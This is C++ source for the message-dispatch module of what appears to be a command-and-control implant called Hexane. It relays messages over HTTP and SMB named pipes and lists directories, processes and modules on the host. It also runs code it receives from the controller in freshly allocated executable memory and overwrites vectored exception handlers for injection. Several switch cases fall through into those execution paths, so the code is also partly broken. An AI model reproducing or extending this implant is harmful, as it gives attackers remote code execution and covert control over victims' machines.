#include <core/include/dispatch.hpp>
namespace Message {

    BOOL PeekPID(const _stream *const stream) {
        HEXANE
        UINT pid = 0;

        x_memcpy(&pid, stream->Buffer, 4);
        if (x_memcmp(&Ctx->Session.PeerId, &pid, 4) == 0) {
            return TRUE;
        }

        return FALSE;
    }

    VOID AddMessage(_stream *const out) {
        HEXANE

        _stream *head = Ctx->Transport.OutboundQueue;

        if (!Ctx->Transport.OutboundQueue) {
            Ctx->Transport.OutboundQueue = out;
        } else {
            while (head->Next) {
                head = head->Next;
            }

            head->Next = out;
        }
    }

    VOID ClearQueue() {
        HEXANE

        _stream *head = Ctx->Transport.OutboundQueue;
        _stream *swap = { };
        _stream *prev = { };

        if (!head) {
            Ctx->Transport.OutboundQueue = nullptr;
            return;
        }

        while (head) {
            if (head->Ready) {
                if (prev) {
                    prev->Next = head->Next;

                } else {
                    Ctx->Transport.OutboundQueue = head->Next;
                }
                swap = head;
                head = head->Next;

                Stream::DestroyStream(swap);

            } else {
                prev = head;
                head = head->Next;
            }
        }
    }

    VOID OutboundQueue(const _stream *out) {
        HEXANE

        _parser parser = { };
        _stream *queue = { };

        if (!out) {
            return_defer(ERROR_NO_DATA);
        }

        if (out->Length > MESSAGE_MAX) {
            QueueSegments(B_PTR(out->Buffer), out->Length);

        } else {
            Parser::CreateParser(&parser, B_PTR(out->Buffer), out->Length);

            queue           = Stream::CreateStream();
            queue->PeerId   = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->TaskId   = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&parser)));
            queue->MsgType  = __bswapd(S_CAST(ULONG, Parser::UnpackDword(&parser)));

            queue->Length   = parser.Length;
            queue->Buffer   = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, queue->Buffer, queue->Length);

            x_memcpy(queue->Buffer, parser.Buffer, queue->Length);
            AddMessage(queue);

            Parser::DestroyParser(&parser);
            Stream::DestroyStream(out);
        }

        defer:
    }

    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
        HEXANE

        _stream *entry = { };

        uint32_t offset     = 0;
        uint32_t peer_id    = 0;
        uint32_t task_id    = 0;
        uint32_t cb_seg     = 0;
        uint32_t index      = 1;

        const auto n_seg = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;

        while (length > 0) {
            cb_seg = length > MESSAGE_MAX - SEGMENT_HEADER_SIZE
                ? MESSAGE_MAX - SEGMENT_HEADER_SIZE
                : length;

            entry = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cb_seg + SEGMENT_HEADER_SIZE));

            x_memcpy(&peer_id, buffer, 4);
            x_memcpy(&task_id, buffer + 4, 4);

            entry->PeerId    = peer_id;
            entry->TaskId    = task_id;
            entry->MsgType   = TypeSegment;

            Stream::PackDword(entry, index);
            Stream::PackDword(entry, n_seg);
            Stream::PackDword(entry, cb_seg);
            Stream::PackBytes(entry, B_PTR(buffer) + offset, cb_seg);

            index++;
            length -= cb_seg;
            offset += cb_seg;

            AddMessage(entry);
        }
    }

    VOID MessageTransmit() {
        HEXANE

        _stream *out    = Stream::CreateStream();
        _stream *in     = { };
        _stream *head   = { };
        _stream *swap   = { };
        _parser parser  = { };

        retry:

        if (!Ctx->Transport.OutboundQueue) {

#ifdef TRANSPORT_SMB
            return_defer(ERROR_SUCCESS);
#elifdef TRANSPORT_HTTP
            PSTREAM entry = Stream::CreateStreamWithHeaders(TypeTasking);

            OutboundQueue(entry);
            goto retry;
#endif

        } else {
            head = Ctx->Transport.OutboundQueue;
            while (head) {
                if (!head->Ready) {

                    if (head->Length + MESSAGE_HEADER_SIZE + out->Length > MESSAGE_MAX) {
                        break;
                    }
                    if (head->Buffer) {
                        Parser::CreateParser(&parser, B_PTR(head->Buffer), head->Length);

                        Stream::PackDword(out, head->PeerId);
                        Stream::PackDword(out, head->TaskId);
                        Stream::PackDword(out, head->MsgType);

                        if (Ctx->Root) {
                            Stream::PackBytes(out, B_PTR(head->Buffer), head->Length);

                        } else {
                            out->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, out->Buffer, out->Length + head->Length);
                            x_memcpy(B_PTR(out->Buffer) + out->Length, head->Buffer, head->Length);

                            out->Length += head->Length;
                        }
                    } else {
                        return_defer(ERROR_NO_DATA);
                    }
                    head->Ready = TRUE;
                }
                head = head->Next;
            }
        }

#ifdef TRANSPORT_HTTP
        Http::HttpCallback(out, &in);
#endif
#ifdef TRANSPORT_PIPE
        Smb::PeerConnectEgress(out, &in);
#endif

        Stream::DestroyStream(out);
        out = nullptr;

        if (in) {
            ClearQueue();

            if (PeekPID(in)) {
                CommandDispatch(in);
                Stream::DestroyStream(in);

            } else {
                swap = in;
                in = out;
                out = swap;

                if (Ctx->Config.IngressPipename) {
                    Smb::PeerConnectIngress(out, &in);

                    if (in) {
                        OutboundQueue(in);
                    }
                }
                Stream::DestroyStream(out);
            }
        } else {
            head = Ctx->Transport.OutboundQueue;
            while (head) {
                head->Ready = FALSE;
                head = head->Next;
            }
        }

    defer:
    }

    RDATA_SECTION _command_map cmd_map[] = {
        {.Id = CommandDir,          .Function = Commands::DirectoryList},
        {.Id = CommandMods,         .Function = Commands::ProcessModules},
        {.Id = CommandProcess,      .Function = Commands::ProcessList},
        {.Id = CommandUpdatePeer,   .Function = Commands::UpdatePeer},
        {.Id = CommandShutdown,     .Function = Commands::Shutdown},
        {.Id = 0,                   .Function = nullptr}
    };

    VOID CommandDispatch (const _stream *const in) {
        HEXANE

        _parser parser = { };
        ULONG msg_type = 0;

        Parser::CreateParser(&parser, B_PTR(in->Buffer), in->Length);
        Parser::UnpackDword(&parser); // throw-away peer id

        Ctx->Session.CurrentTaskId  = Parser::UnpackDword(&parser);
        msg_type = Parser::UnpackDword(&parser);

        switch (msg_type) {

            case TypeCheckin: {
                Ctx->Session.Checkin = TRUE;
                break;
            }

            case TypeTasking: {
                auto cmd_id = Parser::UnpackDword(&parser);
                if (cmd_id == CommandNoJob) {
                    break;
                }

                for (uint32_t i = 0 ;; i++) {
                    if (!cmd_map[i].Function) {
                        return_defer(ERROR_PROC_NOT_FOUND);
                    }

                    if (cmd_map[i].Id == cmd_id) {
                        const auto cmd = R_CAST(void(*)(_parser*), Ctx->Base.Address + U_PTR(cmd_map[i].Function));
                        cmd(&parser);
                        break;
                    }
                }
            }

            case TypeExecute: {
                void *exec  = { };
                size_t size = parser.Length;

                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                    return_defer(ntstatus);
                }

                x_memcpy(exec, parser.Buffer, parser.Length);
                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), &exec, &size, PAGE_EXECUTE_READ, nullptr))) {
                    return_defer(ntstatus);
                }

                auto (*cmd)(_parser*) = R_CAST(void(*)(_parser*), exec);
                cmd(&parser);

                x_memset(exec, 0, size);

                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
                    return_defer(ntstatus);
                }
            }

        case TypeVeh: {
                const Injection::Veh::_veh_writer writer {
                    .mod_name   = Parser::UnpackWString(&parser, nullptr),
                    .signature  = Parser::UnpackString(&parser, nullptr),
                    .mask       = Parser::UnpackString(&parser, nullptr),
                    .target     = R_CAST(void*, Parser::UnpackDword64(&parser)),
                };

                OverwriteFirstHandler(writer);
            }

            default:
                break;
        }

        defer:
        Parser::DestroyParser(&parser);
    }
}
